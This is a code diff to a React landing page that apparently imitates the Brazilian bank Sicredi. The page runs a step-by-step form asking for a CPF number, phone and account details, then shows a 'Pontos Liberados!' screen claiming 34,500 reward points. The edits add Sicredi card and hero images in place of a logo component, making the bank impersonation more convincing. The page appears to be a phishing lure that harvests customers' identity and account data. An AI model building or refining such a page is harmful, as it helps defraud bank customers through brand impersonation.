@@ -9,6 +9,10 @@ import PhoneForm from "@/components/forms/phone-form";
 import AccountForm from "@/components/forms/account-form";
 import { SicrediLogo } from "@/components/ui/sicredi-logo";
 
+// Import the assets
+import sicrediCardsImg from '../assets/sicredi-cards.jpg';
+import sicrediHeroImg from '../assets/sicredi-hero.png';
+
 // Define the steps in the form flow
 enum FormStep {
   CPF = 'cpf',
@@ -132,7 +136,12 @@ export default function HomePage() {
   };
 
   return (
-    <div className="flex min-h-screen items-center justify-center bg-gray-50 p-4">
+    <div className="flex min-h-screen items-center justify-center bg-gray-50 p-4" 
+      style={{
+        background: `url(${sicrediHeroImg}) no-repeat right top`,
+        backgroundSize: 'contain',
+        backgroundColor: '#f9f9f9'
+      }}>
       <div className="max-w-md w-full bg-white rounded-[40px] border-2 border-[#33820D] shadow-lg p-6 text-center relative">
         
         {/* Render the appropriate form step */}
@@ -143,7 +152,7 @@ export default function HomePage() {
             </h1>
             
             <div className="my-6">
-              <SicrediLogo className="mx-auto h-20" />
+              <img src={sicrediCardsImg} alt="Cartões Sicredi" className="mx-auto h-40 object-contain rounded-lg" />
             </div>
             
             <p className="text-lg mb-6">
@@ -165,6 +174,10 @@ export default function HomePage() {
             </div>
             
             <h2 className="text-2xl font-bold text-[#33820D] mb-3">Pontos Liberados!</h2>
+            
+            <div className="my-4">
+              <img src={sicrediCardsImg} alt="Cartões Sicredi" className="mx-auto h-32 object-contain rounded-lg" />
+            </div>
             
             <div className="bg-gray-100 rounded-2xl p-4 mb-4">
               <p className="text-3xl font-bold text-[#33820D]">34.500 PTS</p>
